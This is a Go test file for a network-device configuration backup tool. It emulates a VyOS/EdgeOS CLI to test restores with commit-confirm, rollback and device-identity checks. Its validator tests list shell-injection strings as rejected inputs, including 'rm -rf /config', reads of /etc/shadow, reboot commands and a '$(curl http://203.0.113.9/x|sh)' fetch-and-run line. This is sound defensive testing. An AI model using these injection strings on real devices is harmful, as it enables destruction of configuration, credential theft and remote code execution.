package configbackup

import (
	"context"
	"io"
	"strings"
	"sync"
	"testing"

	"golang.org/x/crypto/ssh"
)

// vyosDevice emulates the parts of the VyOS / EdgeOS CLI a restore uses: operational mode
// ("show version", "show configuration commands"), configuration mode with a per-session candidate
// ("set", "delete <node>", "commit-confirm N" with its "Proceed?" question, "confirm", "commit",
// "discard", "save", "run show …", "exit" / "exit discard"). A protocol test double on loopback only.
type vyosDevice struct {
	mu        sync.Mutex
	running   []string
	saved     []string
	pending   bool // commit-confirm active, not yet confirmed (the real device reboots into saved)
	confirmed bool
	commits   []string
	sessions  int
	model     string
	serial    string
	// Faults.
	rejectSet       string // a "set" line containing this is refused
	mangleOnCommit  bool   // the device activates something else than the candidate
	refuseReconnect bool   // after commit-confirm, new SSH sessions get no CLI
	failCommit      bool   // commit-confirm fails without changing anything
	setLines        int
}

const vyosRunning = `set interfaces ethernet eth0 address '192.168.30.1/24'
set interfaces ethernet eth0 description 'LAN'
set service ssh port '22'
set system host-name 'vyos'
set system login user vyos authentication encrypted-password '$6$now$abc'`

const vyosRestore = `set interfaces ethernet eth0 address '192.168.30.1/24'
set interfaces ethernet eth0 description 'LAN (old)'
set service ssh port '22'
set service ntp server time1.vyos.net
set system host-name 'vyos-old'
set system login user vyos authentication encrypted-password '$6$old$def'`

func vyosDelete(lines []string, node string) []string {
	var out []string
	for _, l := range lines {
		if f := strings.Fields(l); len(f) >= 2 && f[1] == node {
			continue
		}
		out = append(out, l)
	}
	return out
}

func (v *vyosDevice) cli(ch ssh.Channel) {
	w := func(text string) { _, _ = io.WriteString(ch, strings.ReplaceAll(text, "\n", "\r\n")) }
	v.mu.Lock()
	v.sessions++
	if v.refuseReconnect && v.pending {
		v.mu.Unlock()
		w("Connection to the management address lost\n")
		return
	}
	v.mu.Unlock()
	op, cfg := "vyos@vyos:~$ ", "vyos@vyos# "
	prompt := op
	inConfig := false
	var candidate []string
	w("Welcome to VyOS!\n" + prompt)
	buf := make([]byte, 1)
	readLine := func() (string, bool) {
		var line []byte
		for {
			if _, err := ch.Read(buf); err != nil {
				return "", false
			}
			if buf[0] == '\n' || buf[0] == '\r' {
				w("\n")
				return string(line), true
			}
			line = append(line, buf[0])
			_, _ = ch.Write(buf)
		}
	}
	show := func() string { return strings.Join(v.running, "\n") + "\n" }
	for {
		cmd, ok := readLine()
		if !ok {
			return
		}
		cmd = strings.TrimSpace(cmd)
		v.mu.Lock()
		switch {
		case cmd == "":
		case cmd == "show version | cat" && !inConfig:
			w("Version:          VyOS 1.4.0\nHardware vendor:  QEMU\nHardware model:   " + v.model + "\nHardware S/N:     " + v.serial + "\n")
		case cmd == vyosShowConfig && !inConfig, cmd == "run "+vyosShowConfig && inConfig:
			w(show())
		case cmd == "configure" && !inConfig:
			inConfig, prompt = true, cfg
			candidate = append([]string(nil), v.running...)
			w("[edit]\n")
		case strings.HasPrefix(cmd, "delete ") && inConfig:
			candidate = vyosDelete(candidate, strings.TrimPrefix(cmd, "delete "))
			w("[edit]\n")
		case strings.HasPrefix(cmd, "set ") && inConfig:
			v.setLines++
			if v.rejectSet != "" && strings.Contains(cmd, v.rejectSet) {
				w("\n  Configuration path: [" + strings.TrimPrefix(cmd, "set ") + "] is not valid\n  Set failed\n\n[edit]\n")
				break
			}
			candidate = append(candidate, cmd)
			w("[edit]\n")
		case strings.HasPrefix(cmd, "commit-confirm ") && inConfig:
			w("commit-confirm will automatically reboot in " + strings.TrimPrefix(cmd, "commit-confirm ") + " minutes unless changes are confirmed.\nProceed? [confirm]")
			v.mu.Unlock()
			answer, ok := readLine()
			v.mu.Lock()
			if !ok {
				v.mu.Unlock()
				return
			}
			if strings.TrimSpace(answer) != "y" {
				w("commit-confirm aborted\n[edit]\n")
				break
			}
			v.commits = append(v.commits, cmd)
			v.pending = true
			if v.failCommit {
				w("\n[ service ntp ]\nCommit failed\n[edit]\n")
				break
			}
			v.running = append([]string(nil), candidate...)
			if v.mangleOnCommit {
				v.running = vyosDelete(v.running, "service")
			}
			w("[edit]\n")
		case cmd == "confirm" && inConfig:
			v.pending, v.confirmed = false, true
			w("[edit]\n")
		case cmd == "commit" && inConfig:
			v.commits = append(v.commits, cmd)
			v.running = append([]string(nil), candidate...)
			w("[edit]\n")
		case cmd == "discard" && inConfig:
			candidate = append([]string(nil), v.running...)
			w("  Changes have been discarded\n[edit]\n")
		case cmd == "save" && inConfig:
			v.saved = append([]string(nil), v.running...)
			w("Saving configuration to '/config/config.boot'...\nDone\n[edit]\n")
		case (cmd == "exit" || cmd == "exit discard") && inConfig:
			inConfig, prompt = false, op
			w("exit\n")
		default:
			w("\n  Invalid command: [" + cmd + "]\n\n")
		}
		v.mu.Unlock()
		w(prompt)
	}
}

func startVyOS(t *testing.T, v *vyosDevice) (*server, Target) {
	t.Helper()
	if v.running == nil {
		v.running = vyosLines(vyosRunning)
		v.saved = vyosLines(vyosRunning)
	}
	dev := &device{version: "SSH-2.0-OpenSSH_9.2p1 Debian-2", password: "s3cret-Pass", cliFn: v.cli}
	key := newHostKey(t)
	srv := startServer(t, dev, key)
	tg := target(srv)
	tg.HostKeySHA256 = ssh.FingerprintSHA256(key.PublicKey())
	tg.HostKeyType = key.PublicKey().Type()
	tg.Driver = vyosDriverID
	return srv, tg
}

func TestRestoreVyOSCommitConfirmVerifiedAndSaved(t *testing.T) {
	v := &vyosDevice{model: "VMware Virtual Platform", serial: "VMW-123"}
	srv, tg := startVyOS(t, v)
	spec := RestoreSpec{Config: vyosRestore, ConfirmMinutes: 3, ExpectedIdentity: &DeviceIdentity{Model: "VMware Virtual Platform", Serial: "VMW-123"}}
	res, err := Restore(context.Background(), tg, spec, opts(srv.addr))
	if err != nil {
		t.Fatalf("restore failed: %v (steps %v)", err, res.Steps)
	}
	if res.Method != RestoreMethodVyOS || !res.Loaded || !res.Committed || !res.Confirmed || res.RolledBack {
		t.Fatalf("unexpected result: %+v", res)
	}
	if !sameSetConfig(strings.Join(v.running, "\n"), vyosRestore) || !sameSetConfig(strings.Join(v.saved, "\n"), vyosRestore) {
		t.Fatalf("running/saved after restore: %v / %v", v.running, v.saved)
	}
	if v.pending || !v.confirmed || strings.Join(v.commits, ",") != "commit-confirm 3" {
		t.Fatalf("pending=%v confirmed=%v commits=%v", v.pending, v.confirmed, v.commits)
	}
	if v.sessions != 2 {
		t.Fatalf("the read-back must use a second SSH session, got %d", v.sessions)
	}
	if res.Identity == nil || res.Identity.Serial != "VMW-123" || !strings.Contains(strings.Join(res.Steps, "|"), "rollback point") {
		t.Fatalf("identity %+v steps %v", res.Identity, res.Steps)
	}
	if !strings.Contains(res.Config, "host-name 'vyos-old'") || strings.Contains(res.Config, "vyos@vyos") {
		t.Fatalf("read-back = %q", res.Config)
	}
}

func TestRestoreVyOSUndoneWhenReadBackDiffers(t *testing.T) {
	v := &vyosDevice{mangleOnCommit: true}
	srv, tg := startVyOS(t, v)
	res, err := Restore(context.Background(), tg, RestoreSpec{Config: vyosRestore}, opts(srv.addr))
	if KindOf(err) != ErrCommandFailed || !strings.Contains(err.Error(), "differs") || !strings.Contains(err.Error(), "previous configuration was put back") {
		t.Fatalf("want an undone restore, got %v (steps %v)", err, res.Steps)
	}
	if !res.Committed || res.Confirmed || !res.RolledBack {
		t.Fatalf("unexpected result: %+v", res)
	}
	if !sameSetConfig(strings.Join(v.running, "\n"), vyosRunning) || v.pending {
		t.Fatalf("the previous configuration must be active and the timer cancelled: %v pending=%v", v.running, v.pending)
	}
	if strings.Join(v.commits, ",") != "commit-confirm 5,commit" {
		t.Fatalf("commits = %v", v.commits)
	}
}

func TestRestoreVyOSUnreachableAfterCommitLeavesTimer(t *testing.T) {
	v := &vyosDevice{refuseReconnect: true}
	srv, tg := startVyOS(t, v)
	res, err := Restore(context.Background(), tg, RestoreSpec{Config: vyosRestore}, opts(srv.addr))
	if KindOf(err) != ErrCommandFailed || !strings.Contains(err.Error(), "new SSH session") {
		t.Fatalf("want a refused restore, got %v", err)
	}
	// Session B fails, the previous configuration is committed again in session A, but it cannot be
	// read back either: the reboot timer stays as the last safeguard.
	if res.Confirmed || res.RolledBack || !v.pending || v.confirmed {
		t.Fatalf("the timer must stay armed: %+v pending=%v", res, v.pending)
	}
	if !sameSetConfig(strings.Join(v.saved, "\n"), vyosRunning) {
		t.Fatalf("the saved rollback point must be the previous configuration: %v", v.saved)
	}
}

func TestRestoreVyOSRefusals(t *testing.T) {
	ctx := context.Background()

	t.Run("refused set line: candidate discarded, nothing committed", func(t *testing.T) {
		v := &vyosDevice{rejectSet: "ntp"}
		srv, tg := startVyOS(t, v)
		res, err := Restore(ctx, tg, RestoreSpec{Config: vyosRestore}, opts(srv.addr))
		if KindOf(err) != ErrCommandFailed || !strings.Contains(err.Error(), "is not valid") {
			t.Fatalf("want the device's reason, got %v", err)
		}
		if res.Loaded || res.Committed || len(v.commits) != 0 || !sameSetConfig(strings.Join(v.running, "\n"), vyosRunning) {
			t.Fatalf("nothing may be committed: %+v commits=%v", res, v.commits)
		}
	})

	t.Run("failed commit with nothing active: timer cancelled", func(t *testing.T) {
		v := &vyosDevice{failCommit: true}
		srv, tg := startVyOS(t, v)
		res, err := Restore(ctx, tg, RestoreSpec{Config: vyosRestore}, opts(srv.addr))
		if KindOf(err) != ErrCommandFailed || !strings.Contains(err.Error(), "nothing was changed") {
			t.Fatalf("want a refused commit, got %v", err)
		}
		if res.Committed || v.pending || !sameSetConfig(strings.Join(v.running, "\n"), vyosRunning) {
			t.Fatalf("the reboot must be cancelled and nothing active: %+v pending=%v", res, v.pending)
		}
	})

	t.Run("different device: refused before configuration mode", func(t *testing.T) {
		v := &vyosDevice{model: "EdgeRouter X 5-Port", serial: "7483C2AAAAAA"}
		srv, tg := startVyOS(t, v)
		spec := RestoreSpec{Config: vyosRestore, ExpectedIdentity: &DeviceIdentity{Model: "EdgeRouter X 5-Port", Serial: "7483C2BBBBBB"}}
		_, err := Restore(ctx, tg, spec, opts(srv.addr))
		if KindOf(err) != ErrDeviceMismatch || !strings.Contains(err.Error(), "7483C2BBBBBB") || v.setLines != 0 || len(v.commits) != 0 {
			t.Fatalf("want ErrDeviceMismatch before any change, got %v (set lines %d)", err, v.setLines)
		}
		spec.AllowOtherDevice = true
		res, err := Restore(ctx, tg, spec, opts(srv.addr))
		if err != nil || !res.Confirmed || !strings.Contains(strings.Join(res.Steps, "|"), "administrator confirmed") {
			t.Fatalf("forced restore onto another device: %v %+v", err, res)
		}
	})

	t.Run("not set commands", func(t *testing.T) {
		v := &vyosDevice{}
		srv, tg := startVyOS(t, v)
		_, err := Restore(ctx, tg, RestoreSpec{Config: "interfaces {\n  ethernet eth0\n}"}, opts(srv.addr))
		if KindOf(err) != ErrInvalidArgument || v.sessions != 0 {
			t.Fatalf("want ErrInvalidArgument before login, got %v (%d sessions)", err, v.sessions)
		}
	})

	t.Run("already current", func(t *testing.T) {
		v := &vyosDevice{}
		srv, tg := startVyOS(t, v)
		res, err := Restore(ctx, tg, RestoreSpec{Config: vyosRunning}, opts(srv.addr))
		if err != nil || res.Committed || res.Config == "" || len(v.commits) != 0 {
			t.Fatalf("nothing to apply: %v %+v", err, res)
		}
	})
}

func TestIdentityParsingAndMismatch(t *testing.T) {
	junos := parseIdentity(junosDriverID, []string{"Hostname: srx\nModel: srx300\nJunos: 21.4R3.15", "Hardware inventory:\nItem             Version  Part number  Serial number     Description\nChassis                                CV1234AF0123      SRX300"})
	if junos == nil || junos.Model != "srx300" || junos.Serial != "CV1234AF0123" {
		t.Fatalf("junos identity = %+v", junos)
	}
	edge := parseIdentity(vyosDriverID, []string{"Version:      v2.0.9\nHW model:     EdgeRouter X 5-Port\nHW S/N:       7483C2123456\nUptime:       01:02:03"})
	if edge == nil || edge.Model != "EdgeRouter X 5-Port" || edge.Serial != "7483C2123456" {
		t.Fatalf("edgeos identity = %+v", edge)
	}
	if parseIdentity(vyosDriverID, []string{"Hardware model:   \nHardware S/N:     "}) != nil || parseIdentity("cisco_ios", []string{"Model: x"}) != nil {
		t.Fatal("empty values and drivers without a reader report no identity")
	}
	if IdentityMismatch(edge, &DeviceIdentity{Model: "EdgeRouter X 5-Port", Serial: "7483c2123456"}) != "" || IdentityMismatch(nil, edge) != "" {
		t.Fatal("same serial (any case) or nothing recorded is not a mismatch")
	}
	if IdentityMismatch(edge, &DeviceIdentity{Model: "EdgeRouter 4"}) == "" || IdentityMismatch(junos, &DeviceIdentity{Serial: "OTHER"}) == "" {
		t.Fatal("a different model or serial is a mismatch")
	}
}

// VyOS configuration mode is a bash shell: no line of a version may carry anything a shell acts on.
func TestValidVyOSConfigRefusesShellInput(t *testing.T) {
	good := []string{
		vyosRunning,
		vyosRestore,
		"set system host-name vyos",
		"set interfaces ethernet eth0 description 'LAN; uplink | $(whoami) `id` && x'",
		"set interfaces ethernet eth0 description 'مكتب'",
		"set firewall name WAN_IN rule 10 destination address 10.0.0.0/8",
		"set interfaces ethernet eth0 address dhcp",
		"set protocols static route 0.0.0.0/0 next-hop 192.168.1.254",
		"set system ntp server 0.pool.ntp.org",
		"set interfaces ethernet eth0 hw-id 00:11:22:33:44:55",
		"set service dns forwarding listen-address 2001:db8::1",
		"set system login user admin full-name ''",
	}
	for _, c := range good {
		if !validVyOSConfig(c) {
			t.Errorf("a real VyOS line was refused: %q", c)
		}
	}
	bad := []string{
		"set system host-name x; reboot now",
		"set system host-name x;reboot",
		"set system host-name x | sh",
		"set system host-name x && rm -rf /config",
		"set system host-name x || true",
		"set system host-name x & sleep 10",
		"set system host-name `id`",
		"set system host-name $(id)",
		"set system host-name $HOME",
		"set system host-name ${IFS}",
		"set system host-name x > /config/config.boot",
		"set system host-name x < /etc/shadow",
		"set system host-name \"$(id)\"",
		"set system host-name 'x'$(id)",
		"set system host-name 'x''y'",
		"set system host-name 'unterminated",
		`set system host-name x\;id`,
		"set system host-name ~root",
		"set system host-name *",
		"set system host-name x\tid",
		"set system host-name x\rreboot",
		"set system host-name x\x03",
		"set system host-name x\x1b[A",
		"set system host-name x\x7f",
		"set system host-name x\u0085id",
		"set system host-name !!",
		"set system host-name x #comment",
		"set system host-name (x)",
		"set system host-name {a,b}",
		"set $(id) x",
		"set 'system' host-name x",
		"set;id",
		"set",
		"show configuration",
		"delete system",
		"set system host-name x\nrun reboot now",
		"set system host-name ok\n; reboot",
		"set system host-name \xff\xfe",
	}
	for _, c := range bad {
		if validVyOSConfig(c) {
			t.Errorf("a hostile line was accepted: %q", c)
		}
	}
}

func TestRestoreVyOSHostileVersionNeverReachesTheDevice(t *testing.T) {
	ctx := context.Background()
	for _, extra := range []string{
		"set system host-name x; reboot now",
		"set system host-name $(curl http://203.0.113.9/x|sh)",
		"set system host-name `id`",
	} {
		v := &vyosDevice{}
		srv, tg := startVyOS(t, v)
		_, err := Restore(ctx, tg, RestoreSpec{Config: vyosRestore + "\n" + extra}, opts(srv.addr))
		if KindOf(err) != ErrInvalidArgument || v.sessions != 0 || v.setLines != 0 {
			t.Fatalf("%q: want ErrInvalidArgument before login, got %v (%d sessions, %d set lines)", extra, err, v.sessions, v.setLines)
		}
	}
}
